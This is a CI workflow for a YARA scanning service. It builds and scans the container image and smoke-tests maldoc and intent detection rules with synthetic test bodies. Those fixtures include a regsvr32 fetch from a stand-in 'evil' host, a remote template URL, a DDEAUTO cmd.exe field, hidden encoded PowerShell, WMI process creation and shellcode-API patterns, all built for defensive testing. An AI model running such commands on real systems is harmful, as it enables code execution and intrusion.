# yarad CI — the per-PR/push gate. Authoritative job is `docker` (self-contained
# libyara); `lint` + `scanners` run alongside. Deep/slow, low-per-PR-yield checks
# (asan, codeql, fuzz) run MONTHLY in maintenance.yml, NOT on every PR. Exposed
# via workflow_call so release.yml runs this same gate before publishing. Build
# with go 1.25 — the 1.24 branch no longer gets the stdlib security fixes
# govulncheck enforces.
name: ci
on:
  push:
    branches: [main, master]
  pull_request:
  workflow_call:

# Cancel a superseded in-progress run when new commits land on the same PR/ref.
concurrency:
  group: ci-${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: true

permissions:
  contents: read

jobs:
  # Authoritative gate: build + test exactly as the production image does (CGO
  # against the statically-built libyara). The Dockerfile `test` target runs
  # `go vet` + `go test -race -tags yara_static`; then we build the final image,
  # run it against a local EICAR rule, and smoke the HTTP contract.
  docker:
    runs-on: ubuntu-latest
    timeout-minutes: 30
    permissions:
      contents: read
      actions: write   # buildx GHA layer cache (--cache-to/from type=gha)
    steps:
      - uses: actions/checkout@v5  # zizmor: ignore[artipacked]

      - uses: docker/setup-buildx-action@8d2750c68a42422c14e847fe6c8ac0403b4cbd6f  # v3

      - name: build test stage (go vet + go test -race in-image)
        run: |
          docker buildx build --target test -f docker/Dockerfile -t yarad-test \
            --load \
            --cache-from type=gha,scope=yarad-build \
            --cache-to type=gha,mode=max,scope=yarad-build \
            .

      - name: build final image
        run: |
          docker buildx build --target final -f docker/Dockerfile -t yarad:ci \
            --load \
            --cache-from type=gha,scope=yarad-build \
            --cache-to type=gha,mode=max,scope=yarad-build \
            --build-arg CACHEBUST=rules-${{ hashFiles('docker/local-rules/**','docker/fetch-rules.sh','docker/compile-rules.sh','docker/Dockerfile') }} \
            .

      - name: trivy image scan (HIGH,CRITICAL)
        run: |
          docker run --rm -v /var/run/docker.sock:/var/run/docker.sock \
            aquasec/trivy:0.62.1 image \
            --severity HIGH,CRITICAL \
            --exit-code 1 \
            --ignore-unfixed \
            --timeout 5m \
            yarad:ci

      - name: generate SBOM (SPDX)
        if: github.event_name == 'push' && github.ref == 'refs/heads/main'
        run: |
          docker run --rm -v /var/run/docker.sock:/var/run/docker.sock \
            anchore/syft:v1.22.0 yarad:ci -o spdx-json > sbom.spdx.json
      - name: upload SBOM artifact
        if: github.event_name == 'push' && github.ref == 'refs/heads/main'
        uses: actions/upload-artifact@v4
        with:
          name: sbom
          path: sbom.spdx.json
          retention-days: 90

      - name: smoke (EICAR rule, scan/clean/auth/health/metrics)
        run: |
          set -euo pipefail
          mkdir -p rules
          cat > rules/eicar.yar <<'YAR'
          rule EICAR_Test_File : test {
            strings: $e = "$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!"
            condition: $e
          }
          YAR
          # This case tests the compile-from-source-dir path; disable the rule
          # cache (YARAD_CACHE_DIR=) so it loads /r directly.
          docker run -d --name yc -e YARAD_TOKEN=ci -e YARAD_RULES= -e YARAD_RULES_DIR=/r -e YARAD_CACHE_DIR= \
            -v "$PWD/rules:/r:ro" -p 18079:8079 yarad:ci
          for _ in $(seq 1 30); do
            [ "$(docker inspect -f '{{.State.Health.Status}}' yc)" = healthy ] && break; sleep 1
          done
          [ "$(docker inspect -f '{{.State.Health.Status}}' yc)" = healthy ] || { docker logs yc; exit 1; }

          # build the EICAR body at runtime (don't ship the literal signature)
          # shellcheck disable=SC2016  # the $-segments are the literal EICAR token, must NOT expand
          EICAR='X5O!P%@AP[4\PZX54(P^)7CC)7}'"\$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!"'$H+H*'

          match=$(printf '%s' "$EICAR" | curl -s -H "X-YARAD-Token: ci" --data-binary @- http://127.0.0.1:18079/scan)
          echo "match: $match"; grep -q EICAR_Test_File <<<"$match"

          clean=$(printf 'plain body' | curl -s -H "X-YARAD-Token: ci" --data-binary @- http://127.0.0.1:18079/scan)
          echo "clean: $clean"; [ "$clean" = '{"matches":[]}' ]

          code=$(printf x | curl -s -o /dev/null -w '%{http_code}' -H "X-YARAD-Token: wrong" --data-binary @- http://127.0.0.1:18079/scan)
          [ "$code" = 401 ]

          # Read each endpoint into a var before grep: piping a producer straight
          # into `grep -q` lets grep exit on first match and SIGPIPE the producer
          # (exit 141) under `set -o pipefail`. (See the seed step's note.)
          m=$(curl -s http://127.0.0.1:18079/metrics); grep -q 'yarad_rules 1' <<<"$m"
          r=$(curl -s http://127.0.0.1:18079/ready);   grep -q ready <<<"$r"
          v=$(curl -s http://127.0.0.1:18079/version); grep -q extractor_version <<<"$v"
          docker rm -f yc

      - name: smoke (maldoc heuristic rule — autoexec+write+execute AND-gate)
        run: |
          set -euo pipefail
          # Load ONLY the tracked maldoc rule (isolated, cache off) so we test the
          # rule itself, decoupled from the full baked bundle.
          mkdir -p rules-maldoc
          cp docker/local-rules/maldoc_autoexec.yara rules-maldoc/
          docker run -d --name ym -e YARAD_TOKEN=ci -e YARAD_RULES= -e YARAD_RULES_DIR=/r -e YARAD_CACHE_DIR= \
            -v "$PWD/rules-maldoc:/r:ro" -p 18081:8079 yarad:ci
          for _ in $(seq 1 30); do
            [ "$(docker inspect -f '{{.State.Health.Status}}' ym)" = healthy ] && break; sleep 1
          done
          [ "$(docker inspect -f '{{.State.Health.Status}}' ym)" = healthy ] || { docker logs ym; exit 1; }

          # Synthetic maldoc body: one token from each mraptor category
          # (auto-exec + write + execute). Built at runtime — no real maldoc shipped.
          body=$(printf 'Sub AutoOpen()\n  Set o = CreateObject("ADODB.Stream")\n  o.SaveToFile "x.exe"\n  CreateObject("WScript.Shell").Run "powershell -enc ..."\nEnd Sub\n')
          match=$(printf '%s' "$body" | curl -s -H "X-YARAD-Token: ci" --data-binary @- http://127.0.0.1:18081/scan)
          echo "match: $match"; grep -q Maldoc_AutoExec_Write_Execute <<<"$match"

          # Negative: auto-exec + a write primitive (incl. CreateObject of a
          # write object) but NO launch primitive must NOT fire — proves the
          # three-category AND and guards the regression where a writer's
          # CreateObject() would wrongly satisfy the "execute" category.
          clean=$(printf 'Sub AutoOpen()\n  Set o = CreateObject("ADODB.Stream")\n  o.SaveToFile "data.bin"\nEnd Sub\n' | curl -s -H "X-YARAD-Token: ci" --data-binary @- http://127.0.0.1:18081/scan)
          echo "clean: $clean"; [ "$clean" = '{"matches":[]}' ]
          docker rm -f ym

      - name: smoke (maldoc suspicious-keyword tier — count heuristic + shellcode-API)
        run: |
          set -euo pipefail
          # Load ONLY the tracked suspicious-keyword rules (isolated, cache off).
          mkdir -p rules-susp
          cp docker/local-rules/maldoc_suspicious.yara rules-susp/
          docker run -d --name yk -e YARAD_TOKEN=ci -e YARAD_RULES= -e YARAD_RULES_DIR=/r -e YARAD_CACHE_DIR= \
            -v "$PWD/rules-susp:/r:ro" -p 18082:8079 yarad:ci
          for _ in $(seq 1 30); do
            [ "$(docker inspect -f '{{.State.Health.Status}}' yk)" = healthy ] && break; sleep 1
          done
          [ "$(docker inspect -f '{{.State.Health.Status}}' yk)" = healthy ] || { docker logs yk; exit 1; }

          # Count heuristic: a keyword-soup macro (>=6 suspicious keywords) fires
          # Maldoc_Suspicious_VBA_Keywords. Built at runtime — no real maldoc.
          soup=$(printf 'CreateObject GetObject WScript.Shell ShellExecute Environ StrReverse ADODB.Stream SaveToFile MSXML2.XMLHTTP\n')
          m1=$(printf '%s' "$soup" | curl -s -H "X-YARAD-Token: ci" --data-binary @- http://127.0.0.1:18082/scan)
          echo "soup: $m1"; grep -q Maldoc_Suspicious_VBA_Keywords <<<"$m1"

          # Shellcode-API pattern: a Declare + a process-injection primitive fires
          # Maldoc_VBA_Shellcode_API.
          sc=$(printf 'Private Declare PtrSafe Function a Lib "kernel32" Alias "VirtualAlloc" (...)\n  RtlMoveMemory p, buf, n\n')
          m2=$(printf '%s' "$sc" | curl -s -H "X-YARAD-Token: ci" --data-binary @- http://127.0.0.1:18082/scan)
          echo "shellcode: $m2"; grep -q Maldoc_VBA_Shellcode_API <<<"$m2"

          # Negative: a couple of keywords below the count threshold and no
          # Declare+API pair must NOT fire either rule.
          clean=$(printf 'Set o = CreateObject("Scripting.Dictionary")\n  MsgBox "hello"\n' | curl -s -H "X-YARAD-Token: ci" --data-binary @- http://127.0.0.1:18082/scan)
          echo "clean: $clean"; [ "$clean" = '{"matches":[]}' ]
          docker rm -f yk

      - name: smoke (OOXML remote-template-injection rule)
        run: |
          set -euo pipefail
          # Load ONLY the new OOXML rule (isolated, cache off) so we test the
          # rule itself, decoupled from the full baked bundle.
          mkdir -p rules-ooxml
          cp docker/local-rules/ooxml_template_injection.yara rules-ooxml/
          docker run -d --name yo -e YARAD_TOKEN=ci -e YARAD_RULES= -e YARAD_RULES_DIR=/r -e YARAD_CACHE_DIR= \
            -v "$PWD/rules-ooxml:/r:ro" -p 18083:8079 yarad:ci
          for _ in $(seq 1 30); do
            [ "$(docker inspect -f '{{.State.Health.Status}}' yo)" = healthy ] && break; sleep 1
          done
          [ "$(docker inspect -f '{{.State.Health.Status}}' yo)" = healthy ] || { docker logs yo; exit 1; }

          # Positive: synthetic body containing the OOXML-EXTERNAL-REL marker
          # with an http:// target — must fire OOXML_Remote_Template.
          # Built at runtime — no real maldoc shipped.
          body=$(printf 'OOXML-EXTERNAL-REL attachedTemplate http://evil.example/t.dotm\n')
          match=$(printf '%s' "$body" | curl -s -H "X-YARAD-Token: ci" --data-binary @- http://127.0.0.1:18083/scan)
          echo "match: $match"; grep -q OOXML_Remote_Template <<<"$match"

          # Negative: plain body with no marker must NOT fire.
          clean=$(printf 'just a plain document body\n' | curl -s -H "X-YARAD-Token: ci" --data-binary @- http://127.0.0.1:18083/scan)
          echo "clean: $clean"; [ "$clean" = '{"matches":[]}' ]
          docker rm -f yo

      - name: smoke (OOXML DDE/DDEAUTO field detection rule)
        run: |
          set -euo pipefail
          # Load ONLY the DDE rule (isolated, cache off) so we test the rule
          # itself, decoupled from the full baked bundle.
          mkdir -p rules-dde
          cp docker/local-rules/ooxml_dde.yara rules-dde/
          docker run -d --name yd -e YARAD_TOKEN=ci -e YARAD_RULES= -e YARAD_RULES_DIR=/r -e YARAD_CACHE_DIR= \
            -v "$PWD/rules-dde:/r:ro" -p 18084:8079 yarad:ci
          for _ in $(seq 1 30); do
            [ "$(docker inspect -f '{{.State.Health.Status}}' yd)" = healthy ] && break; sleep 1
          done
          [ "$(docker inspect -f '{{.State.Health.Status}}' yd)" = healthy ] || { docker logs yd; exit 1; }

          # Positive: synthetic body containing the OOXML-DDE-FIELD marker with a
          # DDEAUTO command — must fire Maldoc_DDE_Field.
          # Built at runtime — no real maldoc shipped.
          v=$(printf 'OOXML-DDE-FIELD DDEAUTO c:\\Windows\\System32\\cmd.exe /k calc\n')
          match=$(printf '%s' "$v" | curl -s -H "X-YARAD-Token: ci" --data-binary @- http://127.0.0.1:18084/scan)
          echo "match: $match"; grep -q Maldoc_DDE_Field <<<"$match"

          # Negative: plain body with no marker must NOT fire.
          clean=$(printf 'just a plain document body\n' | curl -s -H "X-YARAD-Token: ci" --data-binary @- http://127.0.0.1:18084/scan)
          echo "clean: $clean"; [ "$clean" = '{"matches":[]}' ]
          docker rm -f yd

      - name: smoke (XLM hidden-macrosheet rule)
        run: |
          set -euo pipefail
          mkdir -p rules-xlm
          cp docker/local-rules/xlm_macrosheet.yara rules-xlm/
          docker run -d --name yxlm -e YARAD_TOKEN=ci -e YARAD_RULES= -e YARAD_RULES_DIR=/r -e YARAD_CACHE_DIR= \
            -v "$PWD/rules-xlm:/r:ro" -p 18087:8079 yarad:ci
          for _ in $(seq 1 30); do
            [ "$(docker inspect -f '{{.State.Health.Status}}' yxlm)" = healthy ] && break; sleep 1
          done
          [ "$(docker inspect -f '{{.State.Health.Status}}' yxlm)" = healthy ] || { docker logs yxlm; exit 1; }

          # Positive: synthetic body containing the XLM-HIDDEN-MACROSHEET marker
          # with veryHidden state and sheet name — must fire XLM_Hidden_Macrosheet.
          # Built at runtime — no real maldoc shipped.
          v=$(printf 'XLM-HIDDEN-MACROSHEET veryHidden Macro1\n')
          match=$(printf '%s' "$v" | curl -s -H "X-YARAD-Token: ci" --data-binary @- http://127.0.0.1:18087/scan)
          echo "match: $match"; grep -q XLM_Hidden_Macrosheet <<<"$match"

          # Negative: plain body with no marker must NOT fire.
          clean=$(printf 'just a plain document body\n' | curl -s -H "X-YARAD-Token: ci" --data-binary @- http://127.0.0.1:18087/scan)
          echo "clean: $clean"; [ "$clean" = '{"matches":[]}' ]
          docker rm -f yxlm

      - name: smoke (XLM dangerous-function rule)
        run: |
          set -euo pipefail
          mkdir -p rules-xlmd
          cp docker/local-rules/xlm_macrosheet.yara rules-xlmd/
          docker run -d --name yxlmd -e YARAD_TOKEN=ci -e YARAD_RULES= -e YARAD_RULES_DIR=/r -e YARAD_CACHE_DIR= \
            -v "$PWD/rules-xlmd:/r:ro" -p 18094:8079 yarad:ci
          for _ in $(seq 1 30); do
            [ "$(docker inspect -f '{{.State.Health.Status}}' yxlmd)" = healthy ] && break; sleep 1
          done
          [ "$(docker inspect -f '{{.State.Health.Status}}' yxlmd)" = healthy ] || { docker logs yxlmd; exit 1; }

          # Positive: a folded XLM formula calling EXEC must fire XLM_Dangerous_Function.
          v=$(printf 'XLM-DANGEROUS-FUNC EXEC\n')
          match=$(printf '%s' "$v" | curl -s -H "X-YARAD-Token: ci" --data-binary @- http://127.0.0.1:18094/scan)
          echo "match: $match"; grep -q XLM_Dangerous_Function <<<"$match"

          # Positive: hidden sheet + dangerous func must ALSO fire the dropper rule.
          v=$(printf 'XLM-HIDDEN-MACROSHEET veryHidden\nXLM-DANGEROUS-FUNC CALL\n')
          match=$(printf '%s' "$v" | curl -s -H "X-YARAD-Token: ci" --data-binary @- http://127.0.0.1:18094/scan)
          echo "match: $match"; grep -q XLM_Hidden_Dangerous_Dropper <<<"$match"

          # Negative: plain body with no marker must NOT fire.
          clean=$(printf 'just a plain document body\n' | curl -s -H "X-YARAD-Token: ci" --data-binary @- http://127.0.0.1:18094/scan)
          echo "clean: $clean"; [ "$clean" = '{"matches":[]}' ]
          docker rm -f yxlmd

      - name: smoke (VBA stomping rule)
        run: |
          set -euo pipefail
          mkdir -p rules-stomp
          cp docker/local-rules/vba_stomping.yara rules-stomp/
          docker run -d --name ystomp -e YARAD_TOKEN=ci -e YARAD_RULES= -e YARAD_RULES_DIR=/r -e YARAD_CACHE_DIR= \
            -v "$PWD/rules-stomp:/r:ro" -p 18088:8079 yarad:ci
          for _ in $(seq 1 30); do
            [ "$(docker inspect -f '{{.State.Health.Status}}' ystomp)" = healthy ] && break; sleep 1
          done
          [ "$(docker inspect -f '{{.State.Health.Status}}' ystomp)" = healthy ] || { docker logs ystomp; exit 1; }

          # Positive: synthetic body containing VBA-STOMPED marker — must fire VBA_Stomped.
          # Built at runtime — no real maldoc shipped.
          v=$(printf 'VBA-STOMPED Module1 pcode=512 src=0\n')
          match=$(printf '%s' "$v" | curl -s -H "X-YARAD-Token: ci" --data-binary @- http://127.0.0.1:18088/scan)
          echo "match: $match"; grep -q VBA_Stomped <<<"$match"

          # Negative: plain body with no marker must NOT fire.
          clean=$(printf 'just a plain document body\n' | curl -s -H "X-YARAD-Token: ci" --data-binary @- http://127.0.0.1:18088/scan)
          echo "clean: $clean"; [ "$clean" = '{"matches":[]}' ]
          docker rm -f ystomp

      - name: smoke (Equation Editor rule)
        run: |
          set -euo pipefail
          mkdir -p rules-eqedit
          cp docker/local-rules/equation_editor.yara rules-eqedit/
          docker run -d --name yeq -e YARAD_TOKEN=ci -e YARAD_RULES= -e YARAD_RULES_DIR=/r -e YARAD_CACHE_DIR= \
            -v "$PWD/rules-eqedit:/r:ro" -p 18089:8079 yarad:ci
          for _ in $(seq 1 30); do
            [ "$(docker inspect -f '{{.State.Health.Status}}' yeq)" = healthy ] && break; sleep 1
          done
          [ "$(docker inspect -f '{{.State.Health.Status}}' yeq)" = healthy ] || { docker logs yeq; exit 1; }

          # Positive: OLE2 magic at offset 0 + "Equation Native" (UTF-16LE) → fires.
          # Build synthetic body: 8-byte OLE magic + padding + wide string.
          match=$(
            {
              printf '\xD0\xCF\x11\xE0\xA1\xB1\x1A\xE1'
              printf '%0.s\x00' {1..64}
              printf 'E\x00q\x00u\x00a\x00t\x00i\x00o\x00n\x00 \x00N\x00a\x00t\x00i\x00v\x00e\x00'
            } | curl -s -H "X-YARAD-Token: ci" --data-binary @- http://127.0.0.1:18089/scan
          )
          echo "match: $match"; grep -q Exploit_EquationEditor <<<"$match"

          # Negative: no OLE2 magic → no match.
          clean=$(printf 'Equation Native in plain text\n' | curl -s -H "X-YARAD-Token: ci" --data-binary @- http://127.0.0.1:18089/scan)
          echo "clean: $clean"; [ "$clean" = '{"matches":[]}' ]
          docker rm -f yeq

      - name: smoke (UserForm hidden-string rule)
        run: |
          set -euo pipefail
          mkdir -p rules-userform
          cp docker/local-rules/userform_strings.yara rules-userform/
          docker run -d --name yuf -e YARAD_TOKEN=ci -e YARAD_RULES= -e YARAD_RULES_DIR=/r -e YARAD_CACHE_DIR= \
            -v "$PWD/rules-userform:/r:ro" -p 18090:8079 yarad:ci
          for _ in $(seq 1 30); do
            [ "$(docker inspect -f '{{.State.Health.Status}}' yuf)" = healthy ] && break; sleep 1
          done
          [ "$(docker inspect -f '{{.State.Health.Status}}' yuf)" = healthy ] || { docker logs yuf; exit 1; }

          # Positive: synthetic body with USERFORM-STRINGS marker + powershell — must fire.
          # Built at runtime — no real maldoc shipped.
          v=$(printf 'USERFORM-STRINGS\npowershell -nop -w hidden -enc ABCDEF\n')
          match=$(printf '%s' "$v" | curl -s -H "X-YARAD-Token: ci" --data-binary @- http://127.0.0.1:18090/scan)
          echo "match: $match"; grep -q Maldoc_UserForm_Payload <<<"$match"

          # Negative: plain body with no marker must NOT fire.
          clean=$(printf 'just a plain document body\n' | curl -s -H "X-YARAD-Token: ci" --data-binary @- http://127.0.0.1:18090/scan)
          echo "clean: $clean"; [ "$clean" = '{"matches":[]}' ]
          docker rm -f yuf

      - name: smoke (doc-properties hidden-string rule)
        run: |
          set -euo pipefail
          mkdir -p rules-docprops
          cp docker/local-rules/docprops.yara rules-docprops/
          docker run -d --name ydp -e YARAD_TOKEN=ci -e YARAD_RULES= -e YARAD_RULES_DIR=/r -e YARAD_CACHE_DIR= \
            -v "$PWD/rules-docprops:/r:ro" -p 18091:8079 yarad:ci
          for _ in $(seq 1 30); do
            [ "$(docker inspect -f '{{.State.Health.Status}}' ydp)" = healthy ] && break; sleep 1
          done
          [ "$(docker inspect -f '{{.State.Health.Status}}' ydp)" = healthy ] || { docker logs ydp; exit 1; }

          # Positive: synthetic body with DOCPROPS-STRINGS marker + powershell -- must fire.
          # Built at runtime -- no real maldoc shipped.
          v=$(printf 'DOCPROPS-STRINGS\npowershell -nop -w hidden -enc ABCDEF\n')
          match=$(printf '%s' "$v" | curl -s -H "X-YARAD-Token: ci" --data-binary @- http://127.0.0.1:18091/scan)
          echo "match: $match"; grep -q Maldoc_DocProps_Payload <<<"$match"

          # Negative: plain body with no marker must NOT fire.
          clean=$(printf 'just a plain document body\n' | curl -s -H "X-YARAD-Token: ci" --data-binary @- http://127.0.0.1:18091/scan)
          echo "clean: $clean"; [ "$clean" = '{"matches":[]}' ]
          docker rm -f ydp

      - name: smoke (intent rules — LOLBin/WMI/PowerShell/evasion)
        run: |
          set -euo pipefail
          # Load ONLY the intent rules (isolated, cache off).
          mkdir -p rules-intent
          cp docker/local-rules/intent.yara rules-intent/
          docker run -d --name yi -e YARAD_TOKEN=ci -e YARAD_RULES= -e YARAD_RULES_DIR=/r -e YARAD_CACHE_DIR= \
            -v "$PWD/rules-intent:/r:ro" -p 18086:8079 yarad:ci
          for _ in $(seq 1 30); do
            [ "$(docker inspect -f '{{.State.Health.Status}}' yi)" = healthy ] && break; sleep 1
          done
          [ "$(docker inspect -f '{{.State.Health.Status}}' yi)" = healthy ] || { docker logs yi; exit 1; }

          # Each name+arg combo must fire its rule. Bodies built at runtime.
          l=$(printf 'Shell("regsvr32 /s /n /i:http://evil/a.sct scrobj.dll")\n')
          ml=$(printf '%s' "$l" | curl -s -H "X-YARAD-Token: ci" --data-binary @- http://127.0.0.1:18086/scan)
          echo "lolbin: $ml"; grep -q LOLBins_Invocation <<<"$ml"

          w=$(printf 'GetObject("winmgmts:").Get("Win32_Process").Create "calc"\n')
          mw=$(printf '%s' "$w" | curl -s -H "X-YARAD-Token: ci" --data-binary @- http://127.0.0.1:18086/scan)
          echo "wmi: $mw"; grep -q WMI_Process_Spawn <<<"$mw"

          p=$(printf 'powershell -nop -w hidden -enc SQBFAFgAIABEAG8AdwBuAGwAbwBhAGQA\n')
          mp=$(printf '%s' "$p" | curl -s -H "X-YARAD-Token: ci" --data-binary @- http://127.0.0.1:18086/scan)
          echo "ps: $mp"; grep -q PowerShell_Abuse_Flags <<<"$mp"

          e=$(printf 'On Error Resume Next\nApplication.Visible = False\nx=Environ("USERNAME")\n')
          me=$(printf '%s' "$e" | curl -s -H "X-YARAD-Token: ci" --data-binary @- http://127.0.0.1:18086/scan)
          echo "evasion: $me"; grep -q Maldoc_AntiAnalysis_Evasion <<<"$me"

          # VBA-ENVIRON %NAME% marker (folded Environ lookup) must fire VBA_Environ_Probe.
          en=$(printf 'VBA-ENVIRON %%APPDATA%%\n')
          men=$(printf '%s' "$en" | curl -s -H "X-YARAD-Token: ci" --data-binary @- http://127.0.0.1:18086/scan)
          echo "environ: $men"; grep -q VBA_Environ_Probe <<<"$men"

          # Negative: bare mentions without abusive args/combos must NOT fire.
          clean=$(printf 'newsletter about powershell and regsvr32 for admins\n' | curl -s -H "X-YARAD-Token: ci" --data-binary @- http://127.0.0.1:18086/scan)
          echo "clean: $clean"; [ "$clean" = '{"matches":[]}' ]
          docker rm -f yi

      - name: smoke (seed-on-startup — default cache config + wiped-cache self-heal)
        run: |
          set -euo pipefail
          # A named volume for the cache so we can wipe it from the host side
          # (the distroless image has no shell/rm to do it in-container).
          docker volume create yc-cache >/dev/null
          # Default config: no YARAD_RULES/_DIR overrides, so the image seeds
          # /var/cache/yarad from the baked /usr/share/yarad seed and serves it.
          docker run -d --name ys -e YARAD_TOKEN=ci -v yc-cache:/var/cache/yarad \
            -p 18080:8079 yarad:ci
          for _ in $(seq 1 60); do
            [ "$(docker inspect -f '{{.State.Health.Status}}' ys)" = healthy ] && break; sleep 1
          done
          [ "$(docker inspect -f '{{.State.Health.Status}}' ys)" = healthy ] || { docker logs ys; exit 1; }
          # Read into a var first: `docker logs … | grep -q` lets grep exit on the
          # first match and SIGPIPE docker-logs (exit 141) under `set -o pipefail`
          # — the flake that reddened PR #31. Assigning first avoids the pipe.
          logs=$(docker logs ys 2>&1); grep -q 'seeded rules cache' <<<"$logs"
          rules=$(curl -s http://127.0.0.1:18080/metrics | grep '^yarad_rules ' | awk '{print $2}')
          echo "seeded rules: $rules"; [ "${rules:-0}" -gt 0 ]

          # Self-heal: wipe the cache volume from the host, restart; it must reseed.
          docker stop ys >/dev/null
          docker run --rm -v yc-cache:/c busybox sh -c 'rm -rf /c/*'
          docker start ys >/dev/null
          for _ in $(seq 1 60); do
            [ "$(docker inspect -f '{{.State.Health.Status}}' ys)" = healthy ] && break; sleep 1
          done
          [ "$(docker inspect -f '{{.State.Health.Status}}' ys)" = healthy ] || { docker logs ys; exit 1; }
          # Seeded a second time after the wipe. Capture the count into a var — do
          # NOT pipe `grep -c` into `grep -q`, which closes the pipe early and
          # SIGPIPEs grep -c (exit 141) under `bash -e`.
          seeds=$(docker logs ys 2>&1 | grep -c 'seeded rules cache' || true)
          echo "seed count: $seeds"; [ "$seeds" -ge 2 ]
          r=$(curl -s http://127.0.0.1:18080/ready); grep -q ready <<<"$r"
          docker rm -f ys; docker volume rm yc-cache

  lint:
    runs-on: ubuntu-latest
    timeout-minutes: 15
    steps:
      - uses: actions/checkout@v5  # zizmor: ignore[artipacked]
      - uses: ./.github/actions/go-setup
      # Cache the compiled analysis-tool binaries in ~/go/bin so they aren't
      # recompiled from source every run (was the ~7-8 min lint bottleneck —
      # go-setup already caches modules + build, not these tool binaries). Bump
      # the `-rev` suffix to force a refresh to newer @latest tool versions.
      - name: cache go analysis tools
        id: gotools
        uses: actions/cache@v4
        with:
          path: ~/go/bin
          key: gotools-${{ runner.os }}-go1.25-rev1
      - name: install analysis tools (on cache miss)
        if: steps.gotools.outputs.cache-hit != 'true'
        run: |
          go install honnef.co/go/tools/cmd/staticcheck@latest
          go install golang.org/x/vuln/cmd/govulncheck@latest
          go install github.com/securego/gosec/v2/cmd/gosec@latest
      - name: gofmt
        run: |
          unformatted=$(gofmt -l cmd internal)
          if [ -n "$unformatted" ]; then echo "gofmt needed on:"; echo "$unformatted"; exit 1; fi
      - name: vet
        run: go vet ./...
      - name: staticcheck
        run: staticcheck ./...
      - name: govulncheck
        # binary cached; the vuln DB is fetched fresh at runtime regardless.
        run: govulncheck ./...
      - name: gosec
        run: gosec ./...

  # Non-Go static analysis (workflows, shell, Dockerfile, dependency CVEs). Run
  # via pinned upstream images instead of marketplace actions to avoid pulling
  # extra third-party Actions into the supply chain.
  scanners:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - uses: actions/checkout@v5  # zizmor: ignore[artipacked]
      # Images pinned to explicit versions (not :latest/:stable) for reproducible,
      # drift-free scans. Bump deliberately.
      - name: actionlint (workflow syntax + embedded shell)
        run: docker run --rm -v "$PWD:/repo" -w /repo rhysd/actionlint:1.7.7 -color
      - name: shellcheck (rule fetch/compile/generate scripts)
        run: docker run --rm -v "$PWD:/mnt" koalaman/shellcheck:v0.10.0 docker/fetch-rules.sh docker/compile-rules.sh docker/generate-rules.sh docker/pprof-capture.sh
      - name: hadolint (Dockerfile; .hadolint.yaml ignores)
        run: docker run --rm -v "$PWD:/repo" -w /repo hadolint/hadolint:v2.12.0 hadolint docker/Dockerfile
      - name: osv-scanner (go.mod/go.sum dependency CVEs)
        run: docker run --rm -v "$PWD:/src" -w /src ghcr.io/google/osv-scanner:v1.9.2 --lockfile=go.mod

      - name: zizmor (Actions supply-chain hardening)
        run: docker run --rm -v "$PWD:/repo" -w /repo ghcr.io/woodruffw/zizmor:1.6.0 --format plain .github/workflows/

      - name: luacheck (Lua lint for rspamd plugin)
        run: |
          docker run --rm -v "$PWD:/src" -w /src alpine:3.21 sh -c '
            apk add --no-cache luarocks5.4 lua5.4-dev gcc musl-dev >/dev/null 2>&1
            luarocks-5.4 install luacheck >/dev/null 2>&1
            luacheck rspamd/
          '

      - name: lua plugin unit tests (dedup contract)
        run: |
          docker run --rm -v "$PWD:/src" -w /src alpine:3.21 sh -c '
            apk add --no-cache lua5.4 >/dev/null 2>&1
            lua5.4 rspamd/test/yara_dedup_spec.lua
          '

      - name: semgrep (non-blocking until tuned)
        continue-on-error: true
        run: |
          docker run --rm -v "$PWD:/src" -w /src \
            semgrep/semgrep:1.119.0 \
            semgrep scan --config auto \
            --exclude 'vendor' --exclude 'testdata' \
            --error

  # NOTE: asan, codeql and fuzz are DEEP, slow, low-per-PR-yield checks — they
  # run MONTHLY (+ on demand) in maintenance.yml, NOT on every PR. The per-PR
  # gate (docker + lint + scanners) stays fast; release.yml reuses THIS workflow
  # (workflow_call) so a tagged release re-runs docker+lint+scanners before
  # publishing. asan/codeql/fuzz run on the monthly cadence, not per release.
